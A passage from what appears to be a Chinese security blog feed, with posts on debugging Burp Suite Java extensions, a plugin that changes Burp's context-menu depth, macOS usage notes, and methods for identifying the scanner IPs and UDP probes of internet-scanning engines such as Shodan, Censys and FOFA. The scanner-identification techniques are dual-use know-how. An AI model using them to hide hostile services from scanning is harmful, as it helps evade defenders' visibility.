目录。用BurpSuite加载这个Jar（不是那个以<code>original-</code>开头的jar包），运行你的第一个BP插件吧。</p><p>如果修改pom.xml后编译，发现修改不生效，先刷新，再运行<code>Lifecycle - clean</code>，再<code>package</code>打包。</p><h3 id="调试插件"><a href="#调试插件" class="headerlink" title="调试插件"></a>调试插件</h3><p>简单的调试可以用打印输出。比如在上方用到的Hello World示例中，加上这两句调用BP提供的<code>IBurpExtenderCallbacks</code>接口方法：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">callbacks.printOutput(<span class="hljs-string">&quot;output&quot;</span>); <span class="hljs-comment">// 输出到 Extensions -&gt; Installed -&gt; 选择自己的插件 -&gt; Output</span><br>callbacks.printError(<span class="hljs-string">&quot;error&quot;</span>); <span class="hljs-comment">// 输出到 Extensions -&gt; Installed -&gt; 选择自己的插件 -&gt; Errors</span><br></code></pre></div></td></tr></table></figure><p>假如在编写或使用插件时，需频繁查看插件日志，可以保留着加载插件时弹出来的那个日志窗口。</p><p>打印调试法毕竟麻烦，还得用断点调试：</p><p>打开运行配置：</p><p><img src="burpsuite-java-extension-code-env-5.png" alt="burpsuite-java-extension-code-env-5.png"></p><p>新建一项<code>Remote JVM Debug</code>的运行配置，可以直接使用默认配置。其默认配置是：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Debugger mode:</span> <span class="hljs-string">Attach</span> <span class="hljs-string">to</span> <span class="hljs-string">remote</span> <span class="hljs-string">JVM</span><br><span class="hljs-attr">Transport:</span> <span class="hljs-string">Socket</span><br><span class="hljs-attr">Host:</span> <span class="hljs-string">localhost</span><br><span class="hljs-attr">Port:</span> <span class="hljs-number">5005</span><br></code></pre></div></td></tr></table></figure><p>运行BP时加上该参数：<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005</code>。如：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">java -agentlib:jdwp=transport=dt_socket,server=y,<span class="hljs-built_in">suspend</span>=n,address=5005 -jar burpsuite.jar<br></code></pre></div></td></tr></table></figure><p>IDEA里执行刚添加的<code>Remote JVM Debug</code>配置，并下断点。 BP加载插件，运行到断点处就会断下。</p><p>另外建议在终端里执行命令来启动BP，因为有的异常你没捕获的话，异常堆栈会在终端里打印，在BP里的插件日志里是看不到的。</p><p>还有一个小tip：按住 <code>Ctrl</code> 或 <code>Command</code> 键并单击插件列表中某个插件的Loaded复选框可以重新加载插件。</p><h3 id="MacOS下的BP插件调试"><a href="#MacOS下的BP插件调试" class="headerlink" title="MacOS下的BP插件调试"></a>MacOS下的BP插件调试</h3><p>假如下载的是BP Mac版本的app（而不是单独的jar包），其自带OpenJDK。如果想用自带OpenJDK启动调试BP的话，就给 <code>Burp Suite Professional.app</code>里的 <code>vmoptions.txt</code> 文件加上一句：</p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm">-agentlib:jdwp=trans<span class="hljs-keyword">port</span>=dt_socket,server=y,suspend=n,address=5005<br></code></pre></div></td></tr></table></figure><p>然而加上后，启动BP失败了。执行 <code>/Applications/Burp\ Suite\ Professional.app/Contents/MacOS/JavaApplicationStub</code>，可以看到报错：</p><figure class="highlight delphi"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs delphi">OpenJDK <span class="hljs-number">64</span>-Bit Server VM warning: Options -Xverify:none <span class="hljs-keyword">and</span> -noverify were <span class="hljs-keyword">deprecated</span> <span class="hljs-keyword">in</span> JDK <span class="hljs-number">13</span> <span class="hljs-keyword">and</span> will likely be removed <span class="hljs-keyword">in</span> a future release.<br>Error occurred during <span class="hljs-keyword">initialization</span> <span class="hljs-keyword">of</span> VM<br>Could <span class="hljs-keyword">not</span> find agent <span class="hljs-keyword">library</span> jdwp <span class="hljs-keyword">on</span> the <span class="hljs-keyword">library</span> path, <span class="hljs-keyword">with</span> error: dlopen(libjdwp.dylib, <span class="hljs-number">0</span>x0001): tried: <span class="hljs-string">&#x27;libjdwp.dylib&#x27;</span> (relative path <span class="hljs-keyword">not</span> allowed <span class="hljs-keyword">in</span> hardened <span class="hljs-keyword">program</span>), <span class="hljs-string">&#x27;/System/Volumes/Preboot/Cryptexes/OSlibjdwp.dylib&#x27;</span> (no such <span class="hljs-keyword">file</span>), <span class="hljs-string">&#x27;/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/server/./libjdwp.dylib&#x27;</span> (mach-o <span class="hljs-keyword">file</span>, but <span class="hljs-keyword">is</span> an incompatible architecture (have <span class="hljs-string">&#x27;x86_64&#x27;</span>, need <span class="hljs-string">&#x27;arm64&#x27;</span>)), <span class="hljs-string">&#x27;/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/server/../libjdwp.dylib&#x27;</span> (no such <span class="hljs-keyword">file</span>), <span class="hljs-string">&#x27;/usr/lib/libjdwp.dylib&#x27;</span> (no such <span class="hljs-keyword">file</span>, <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> dyld cache), <span class="hljs-string">&#x27;libjdwp.dylib&#x27;</span> (relative path <span class="hljs-keyword">not</span> allowed <span class="hljs-keyword">in</span> hardened <span class="hljs-keyword">program</span>), <span class="hljs-string">&#x27;/usr/lib/libjdwp.dylib&#x27;</span> (no such <span class="hljs-keyword">file</span>, <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> dyld cache)<br></code></pre></div></td></tr></table></figure><p>提示缺少<code>libjdwp.dylib</code>库文件。我的解决方式是：</p><ol><li><p>执行<code>/Applications/Burp\ Suite\ Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java -version</code>，先看下OpenJDK的版本，是openjdk 19.0.2：</p> <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">openjdk</span> version <span class="hljs-string">&quot;19.0.2&quot;</span> <span class="hljs-number">2023</span>-<span class="hljs-number">01</span>-<span class="hljs-number">17</span><br><span class="hljs-attribute">OpenJDK</span> Runtime Environment (build <span class="hljs-number">19</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>+<span class="hljs-number">7</span>-<span class="hljs-number">44</span>)<br><span class="hljs-attribute">OpenJDK</span> <span class="hljs-number">64</span>-Bit Server VM (build <span class="hljs-number">19</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>+<span class="hljs-number">7</span>-<span class="hljs-number">44</span>, mixed mode)<br></code></pre></div></td></tr></table></figure></li><li><p>到 <a href="https://www.oracle.com/java/technologies/javase/jdk19-archive-downloads.html">https://www.oracle.com/java/technologies/javase/jdk19-archive-downloads.html</a> 下载一个对应版本的jdk包。（注意自己的CPU架构是x64还是Arm 64）</p></li><li><p>解压刚下载的jdk包，并将 <code>libjdwp.dylib</code> 和 <code>libdt_socket.dylib</code>文件拷贝到<code>Burp Suite Professional.app</code>里：</p> <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cp <span class="hljs-regexp">/Users/</span>ovie<span class="hljs-regexp">/Downloads/</span>jdk-<span class="hljs-number">19.0</span>.<span class="hljs-number">2</span>.jdk<span class="hljs-regexp">/Contents/</span>Home<span class="hljs-regexp">/lib/</span>libjdwp.dylib <span class="hljs-regexp">/Applications/</span>Burp\ Suite\ Professional.app<span class="hljs-regexp">/Contents/</span>Resources<span class="hljs-regexp">/jre.bundle/</span>Contents<span class="hljs-regexp">/Home/</span>lib<span class="hljs-regexp">/server/</span>libjdwp.dylib<br><br>cp <span class="hljs-regexp">/Users/</span>ovie<span class="hljs-regexp">/Downloads/</span>jdk-<span class="hljs-number">19.0</span>.<span class="hljs-number">2</span>.jdk<span class="hljs-regexp">/Contents/</span>Home<span class="hljs-regexp">/lib/</span>libdt_socket.dylib <span class="hljs-regexp">/Applications/</span>Burp\ Suite\ Professional.app<span class="hljs-regexp">/Contents/</span>Resources<span class="hljs-regexp">/jre.bundle/</span>Contents<span class="hljs-regexp">/Home/</span>lib<span class="hljs-regexp">/server/</span>libdt_socket.dylib<br></code></pre></div></td></tr></table></figure></li></ol><p>附：之前遇到的一个问题，OpenJDK里没有 <code>com.sun.net.httpserver.HttpServer</code> 这个类（在Oracle JDK里，这个类在 <code>rt.jar</code>），如果BP插件里用此类启动http服务，会报 <code>java.lang.NoClassDefFoundError: com/sun/net/httpserver/HttpServer</code>。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Burpsuite</tag>
      
      <tag>Web安全</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何找出网络空间测绘引擎扫描客户端IP</title>
    <link href="/2023/12/29/find-cyberspace-search-engine/"/>
    <url>/2023/12/29/find-cyberspace-search-engine/</url>
    
    <content type="html"><![CDATA[<p>年底了，水一篇文章。目前的网络空间测绘引擎有fofa、shodan、zoomeye、hunter、censys等，这篇文章主要写写如何找出它们的扫描客户端IP与UDP probe数据包。</p><h3 id="自己公开"><a href="#自己公开" class="headerlink" title="自己公开"></a>自己公开</h3><p>比如 Censys 公开了自己的扫描客户端ip：<a href="https://support.censys.io/hc/en-us/articles/360043177092-Opt-Out-of-Data-Collection">https://support.censys.io/hc/en-us/articles/360043177092-Opt-Out-of-Data-Collection</a></p><h3 id="第三方平台"><a href="#第三方平台" class="headerlink" title="第三方平台"></a>第三方平台</h3><p>网上一些平台也收集了一些：</p><ul><li>fapro ：<a href="https://faweb.fofapro.com/classification/">https://faweb.fofapro.com/classification/</a></li><li>GreyNoise：<a href="https://viz.greynoise.io/query?gnql=actor%3AShodan.io">https://viz.greynoise.io/query?gnql=actor%3AShodan.io</a> ， 这个站点还分析了相似IP， 如 <a href="https://viz.greynoise.io/ip/159.65.111.154">https://viz.greynoise.io/ip/159.65.111.154</a> 这个 BinaryEdge 的ip，点击页面的View Similar IPs 可以大概看看可能是 BinaryEdge 的其他IP（该功能需登录订阅）</li></ul><p>通过搜索引擎搜索也可以搜索到一些，如shodan扫描器的ip：</p><ul><li><a href="https://gist.github.com/jfqd/4ff7fa70950626a11832a4bc39451c1c">https://gist.github.com/jfqd/4ff7fa70950626a11832a4bc39451c1c</a></li><li><a href="https://wiki.ipfire.org/configuration/firewall/blockshodan">https://wiki.ipfire.org/configuration/firewall/blockshodan</a></li></ul><h3 id="回显ip的服务"><a href="#回显ip的服务" class="headerlink" title="回显ip的服务"></a>回显ip的服务</h3><p>互联网上有一些服务会输出来访者的ip，那如何找到这类服务呢。</p><p>利用公开的扫描客户端IP去它的搜索引擎里去搜索。  如：</p><ul><li>使用shodan的ip去shodan搜索 <a href="https://www.shodan.io/search?query=%2271.6.167.142%22+-Ethereum+-NTP">“71.6.167.142” -Ethereum -NTP</a>，  可提取出这个特征 <a href="https://www.shodan.io/search?query=http.html%3A%22Outlook+Logon%22+http.html%3A%22Never+gonna+give+you+up%22">http.html:”Outlook Logon” http.html:”Never gonna give you up”</a> 的服务会回显IP（这些服务看着好像是蜜罐）</li><li>使用censys公开的网段去censys搜索，<a href="https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=services.http.response.body%3A+%22162.142.125%22&ref=censysgpt">services.http.response.body: “162.142.125”</a>，可以提取出一些特征，如：<a href="https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=services%3A%28http.response.body%3A+%22%E4%BD%A0%E7%9A%84IP%EF%BC%9A%22+and+port%3A80%29">services:(http.response.body: “你的IP：” and port:80)</a></li></ul><p>而Fofa会将自己的IP给替换成 <code>*.*.*.*</code>，像 <a href="https://fofa.info/result?qbase64=aXMgbm90IGFsbG93ZWQgIHRvIGNvbm5lY3QgdG8gdGhpcyBNeVNRTCBzZXJ2ZXI%3D">“is not allowed to connect to this MySQL server”</a> 。 那是不是可以用 <code>&quot;*.*.*.*&quot;</code>搜索出那些回显IP的服务呢。测试了下并不行，估计是分词搜索的原因。</p><p>而zoomeye会把自己的ip替换为<code>xxx.xxx.xxx.xxx</code>，可以使用 <a href="https://www.zoomeye.org/searchResult?q=%22xxx.xxx.xxx.xxx%22">“xxx.xxx.xxx.xxx”</a>去搜索。</p><p>后面我也注意到，其实fofa跟zoomeye的替换并不全面。fofa没有替换http响应里的ip，像 <a href="https://fofa.info/result?qbase64=IkJhZCBSZXF1ZXN0IiAmJiAiaXAi">“Bad Request” &amp;&amp; “ip”</a> ，<a href="https://fofa.info/result?qbase64=aGVhZGVyPSJ4LXJlcXVlc3QtaXAiIA%3D%3D">header=”x-request-ip”</a> 。且对于一些被截取、被编码的ip或其他格式的ip，也不会替换到。</p><p>要找到这些回显IP的服务，也可以自己全网扫一遍看哪些服务会回显自己的ip，记录下来。</p><h3 id="UDP-Probe数据包"><a href="#UDP-Probe数据包" class="headerlink" title="UDP Probe数据包"></a>UDP Probe数据包</h3><p>对于UDP服务的识别需要发送一个该协议的probe包，在互联网上有一些机器起的是echo服务，就是你发什么它就回复什么。像 <a href="https://fofa.info/result?qbase64=YmFzZV9wcm90b2NvbD0idWRwIiAmJiBwb3J0PSIyNDI1IiAmJiBiYW5uZXI9InRlc3Q6UEM6MzI6Z3JhYiB0ZXN0Ig%3D%3D">base_protocol=”udp” &amp;&amp; port=”2425” &amp;&amp; banner=”test:PC:32:grab test”</a> ，<a href="https://fofa.info/result?qbase64=IkdFVCAvIEhUVFAvMS4xIiAmJiAiQWNjZXB0OiAqLyoiICYmIHByb3RvY29sPSJ1bmtub3duIg%3D%3D">“GET / HTTP/1.1” &amp;&amp; “Accept: <em>/</em>“ &amp;&amp; protocol=”unknown”</a> ，<a href="https://hunter.qianxin.com/list?search=protocol%3D%3D%22echo%22&conditions=">protocol==”echo”</a> 。区分出这些机器后，再用这些机器ip去搜索可以大概知道各扫描客户端对不同UDP端口发的是什么UDP包。</p><h3 id="部署蜜罐"><a href="#部署蜜罐" class="headerlink" title="部署蜜罐"></a>部署蜜罐</h3><p>自己部署蜜罐成本大，没弄过。</p>]]></content>
    
    
    
    <tags>
      
      <tag>网络空间测绘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Burpsuite 插件开发 - 修改右键菜单层级</title>
    <link href="/2023/09/27/burpsuite-extension-menu-level/"/>
    <url>/2023/09/27/burpsuite-extension-menu-level/</url>
    
    <content type="html"><![CDATA[<p>BurpSuite新版本中，插件注册的右键菜单在 Extensions -&gt; 插件名 -&gt; 插件菜单 ，点起来比较麻烦。测了几个BurpSuite版本，这个更改在下面几个版本改的：</p><ul><li>v2021.7： 第三层。右键 - Extensions -&gt; 插件名 -&gt; 插件菜单</li><li>v2021.4、v2021.5、v2021.6： 第二层。右键 - Extensions - 插件菜单</li><li>v2021.3： 第一层。右键 - 插件菜单</li></ul><p>写了个小插件 <a href="https://github.com/Ovi3/burp-menu-level">BurpMenuLevel</a> ，用来修改右键插件菜单层级的。这个插件适用于v2021.7及之后的版本。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>如果插件要添加右键菜单，需要实现<code>IContextMenuFactory</code>接口的<code>public List&lt;JMenuItem&gt; createMenuItems(IContextMenuInvocation invocation)</code>方法，并调用<code>callbacks.registerContextMenuFactor</code>方法来注册。</p><p>每次在Repeater界面或其它地方上右键，Burp就会调用<code>createMenuItems</code>方法来获取菜单列表，然后添加到<code>插件名</code>的子菜单里，再将<code>插件名</code>菜单加到<code>Extensions</code>的子菜单里。</p><p>想了一种实现方式：监听自己插件菜单的父组件更改事件（<code>HierarchyEvent</code>事件），就可以获取其父组件<code>插件名</code>菜单，同理，再监听<code>插件名</code>菜单，获取<code>Extensions</code>菜单，再监听<code>Extensions</code>菜单，获取第一层的整个右键菜单，获取到这个之后，整个菜单就可以随意修改。</p><p>三层事件监听：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changeContextMenuLevel</span><span class="hljs-params">(List&lt;JMenuItem&gt; myMenus, <span class="hljs-type">int</span> level)</span> &#123;<br>    <span class="hljs-keyword">if</span> (myMenus.size() == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">flagMenu</span> <span class="hljs-operator">=</span> myMenus.get(<span class="hljs-number">0</span>);<br>    flagMenu.addHierarchyListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HierarchyListener</span>() &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">ran</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hierarchyChanged</span><span class="hljs-params">(HierarchyEvent e)</span> &#123;<br>            <span class="hljs-keyword">if</span> ((e.getChangeFlags() &amp; HierarchyEvent.PARENT_CHANGED) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!ran) &#123;<br>                    ran = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-keyword">if</span> (flagMenu.getParent() == <span class="hljs-literal">null</span> || !(flagMenu.getParent() <span class="hljs-keyword">instanceof</span> JPopupMenu)) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    <span class="hljs-type">JPopupMenu</span> <span class="hljs-variable">popupMenu</span> <span class="hljs-operator">=</span> (JPopupMenu) flagMenu.getParent();<br>                    <span class="hljs-type">Component</span> <span class="hljs-variable">invoker</span> <span class="hljs-operator">=</span> popupMenu.getInvoker();<br><br>                    <span class="hljs-keyword">if</span> (!(invoker <span class="hljs-keyword">instanceof</span> JMenuItem) || !((JMenuItem) invoker).getText().equals(extensionName)) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">extensionNameMenuItem</span> <span class="hljs-operator">=</span> (JMenuItem)invoker;<br>                    extensionNameMenuItem.addHierarchyListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HierarchyListener</span>() &#123;<br>                        <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">ran2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hierarchyChanged</span><span class="hljs-params">(HierarchyEvent e)</span> &#123;<br>                            <span class="hljs-keyword">if</span> ((e.getChangeFlags() &amp; HierarchyEvent.PARENT_CHANGED) != <span class="hljs-number">0</span>) &#123;<br>                                <span class="hljs-keyword">if</span> (!ran2) &#123;<br>                                    ran2 = <span class="hljs-literal">true</span>;<br><br>                                    <span class="hljs-keyword">if</span> (extensionNameMenuItem.getParent() == <span class="hljs-literal">null</span> || !(extensionNameMenuItem.getParent() <span class="hljs-keyword">instanceof</span> JPopupMenu)) &#123;<br>                                        <span class="hljs-keyword">return</span>;<br>                                    &#125;<br>                                    <span class="hljs-type">JPopupMenu</span> <span class="hljs-variable">extensionsPopupMenu</span> <span class="hljs-operator">=</span> (JPopupMenu) extensionNameMenuItem.getParent();<br><br>                                    <span class="hljs-type">Component</span> <span class="hljs-variable">invoker2</span> <span class="hljs-operator">=</span> extensionsPopupMenu.getInvoker();<br><br>                                    <span class="hljs-keyword">if</span> (!(invoker2 <span class="hljs-keyword">instanceof</span> JMenuItem) || !((JMenuItem) invoker2).getText().equals(<span class="hljs-string">&quot;Extensions&quot;</span>)) &#123;<br>                                        <span class="hljs-keyword">return</span>;<br>                                    &#125;<br>                                    <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">extensionsMenuItem</span> <span class="hljs-operator">=</span> (JMenuItem) invoker2;<br>                                    extensionsMenuItem.addHierarchyListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HierarchyListener</span>() &#123;<br>                                        <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">ran3</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>                                        <span class="hljs-meta">@Override</span><br>                                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hierarchyChanged</span><span class="hljs-params">(HierarchyEvent e)</span> &#123;<br>                                            <span class="hljs-keyword">if</span> ((e.getChangeFlags() &amp; HierarchyEvent.PARENT_CHANGED) != <span class="hljs-number">0</span>) &#123;<br>                                                <span class="hljs-keyword">if</span> (!ran3) &#123;<br>                                                    ran3 = <span class="hljs-literal">true</span>;<br><br>                                                    <span class="hljs-keyword">if</span> (extensionsMenuItem.getParent() == <span class="hljs-literal">null</span> || !(extensionsMenuItem.getParent() <span class="hljs-keyword">instanceof</span> JPopupMenu)) &#123;<br>                                                        <span class="hljs-keyword">return</span>;<br>                                                    &#125;<br>                                                    extensionsPopupMenu.remove(extensionNameMenuItem);  <span class="hljs-comment">// 移除自身插件菜单</span><br><br>                                                    <span class="hljs-type">JPopupMenu</span> <span class="hljs-variable">topLevelPopupMenu</span> <span class="hljs-operator">=</span> (JPopupMenu) extensionsMenuItem.getParent();<br><br>                                                    <span class="hljs-comment">// 拿到 extensionsPopupMenu、topLevelPopupMenu 就能为所欲为了</span><br><span class="hljs-comment">// 整个右键菜单都可以修改，如添加Covert selection编码方式等</span><br><br>                                                &#125;<br>                                            &#125;<br>                                        &#125;<br>                                    &#125;);<br><br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125;);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>另一种可能可行的方式是，注册一个<code>AWTEventListener</code>监听整个GUI的事件是获取右键菜单对象。这种方式我没去试。</p><h2 id="插件截图"><a href="#插件截图" class="headerlink" title="插件截图"></a>插件截图</h2><p>默认的菜单层级：</p><p><img src="burpsuite-extension-menu-level-0.png" alt=""></p><p>设置下：</p><p><img src="burpsuite-extension-menu-level-1.png" alt=""></p><p>修改后的效果：</p><p><img src="burpsuite-extension-menu-level-2.png" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>Burpsuite</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>苹果电脑使用笔记</title>
    <link href="/2023/07/28/macbook-pro-use-note/"/>
    <url>/2023/07/28/macbook-pro-use-note/</url>
    
    <content type="html"><![CDATA[<p>最近入手了一台苹果电脑（也有两个月了），成年人的第一台苹果电脑，Macbook Pro，M2芯片，Ventura 13.3。</p><p>Mac电脑的很多操作跟Windows电脑的不一样，导致经常按错 Ctrl 和 Command 或 Shift 和 中英文切换键，又比如用Windows电脑时习惯性刷新桌面，Mac没有这操作（或者说没必要），也没有右键新建文件等等。所以有必要好好学学，习惯下，提高效率。</p><p>Mac电脑也有一些缺点：没多少游戏，一些安全工具只支持win系统，部分软件不支持M2芯片。</p><p>但是用起来是真的流畅。</p><p>本文记录下我的个人常用操作，配置，和常用软件下载安装。</p><h1 id="主桌面介绍"><a href="#主桌面介绍" class="headerlink" title="主桌面介绍"></a>主桌面介绍</h1><p>顶部菜单栏：</p><ul><li>去掉Siri：系统设置 - 控制中心 - Siri - 不在菜单栏中显示</li><li>调整菜单栏APP顺序：Command + 鼠标拖动</li></ul><p>右侧通知中心：两指从触控板最右向左滑 或 点击顶部菜单栏右侧的时间。（我就设置为显示个天气和日历）</p><p>控制中心：在顶部菜单栏右侧的一个按钮</p><p>底部程序坞：对于不常用的软件可以右键 - 选项 - 从程序坞中移除</p><p>调度中心：三指上滑打开</p><p>左侧台前调度：可在控制中心里打开。打开了这个，就不能同时显示多个不同应用的窗口了，但可以使用分屏。</p><p>启动台：拇指和另外三根手指合拢</p><p>触发角：屏幕的四个角，系统设置 - 桌面与程序坞 - 触发角。 可设置一两个常用的，如显示桌面</p><h1 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h1><ul><li>将光标移动速度调快（默认的设置移动得慢，在终端下移动尤为明显）：设置 - 键盘， 将“键重复速率”调到快，将“重复前延迟”调到短。前者对应移动速度，后者移动前的反应时间。</li><li>修改电脑名称：系统设置 - 通用 - 关于本机，直接在名称一栏打字修改； 修改本地主机名：系统设置 - 通用 - 共享，修改本地主机名</li><li>访达里显示所有文件的扩展名：设置 - 高级 - 显示所有文件扩展名</li></ul><h1 id="操作与快捷键"><a href="#操作与快捷键" class="headerlink" title="操作与快捷键"></a>操作与快捷键</h1><p>按F1键：按住Fn再点击键盘上的触控栏（有的Mac电脑没触控栏，这种情况估计是按Fn键跟F1吧）</p><p>尽量避免单击触控板：</p><ul><li>用其他操作来代替单击：三指向上滑动和向下滑动来切换应用（不用单击触控板）</li><li>可以设置：系统设置 - 触控板 - 触控板 - 轻点来点按， 这样就不用物理按下触控板（但可能会误触）</li></ul><p>Safari：</p><ul><li>切换标签页：Control + Tab 或 Control + Shift + Tab。 通过快捷键来切换，感觉也不是很方便</li><li>在新标签页中打开网页：按住 Command 键再点链接</li></ul><p>自带终端：</p><ul><li>将光标移动到行首（Control + A）或行尾（Control + E）</li><li>向左或向右移动一个单词：Option + 方向键</li><li>删除一个单词：Control + W</li><li>删除整行：Control + U（这是zsh的快捷键，在bash下，这个快捷键是删除光标到行首的字符）</li><li>删除光标到行首的字符：Meta + W （终端 - 设置 - 描述文件 - 键盘 - 将Option作为Meta键）</li></ul><p>访达：</p><ul><li>长按 Option 键：显示当前路径</li><li>Command + Option + C：复制当前路径</li><li>Command + 退格键：删除文件</li><li>可右键新建目录，不可新建文件。要新建文件可用其他软件，如VSCode等，或 touch 命令</li><li>复制粘贴文件：C<em>ommand</em> + <em>C ，</em> C<em>ommand</em> + V。 剪切粘贴文件：C<em>ommand</em> + <em>C ，</em> C<em>ommand</em> + Option + V</li></ul><p>归档实用工具：</p><ul><li>macOS自带的归档实用工具可以zip压缩和解压</li><li>不支持rar格式压缩包</li><li>不支持加密压缩</li><li>可以安装 bandizip 或其他压缩软件</li><li>对于rar格式压缩，可安装rar命令： <code>brew install rar</code></li></ul><p>其他快捷键：</p><ul><li>与Windows系统不同的是，Mac下有单独的中英文切换键，而不是用Shift切换中英文</li><li>Command + 空格键：显示聚焦搜索</li><li>Command + W：关闭窗口</li><li>Command + Q：关闭程序</li><li>Option + Command + D：显示/隐藏底部程序坞</li><li>Control  + Command + Q：立即锁定屏幕</li><li>长按 Command + 空格键：启动Siri （估计快捷键冲突了，在我电脑上按这个没反应）</li><li>Fn + F：全屏</li><li>Fn + 退格键：删除右侧字符</li><li>Command + 方向键：移到行首或行尾</li></ul><p>（记不住那么多快捷键，容易搞混，选一些常用的记住，其余的用其他操作代替）</p><h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><ul><li>Mach-O（Mach Object File Format）格式文件：可执行文件和动态库都是这个格式的文件。由dyld程序加载</li><li>.dylib后缀为动态库文件，.a后缀为静态库文件。 执行 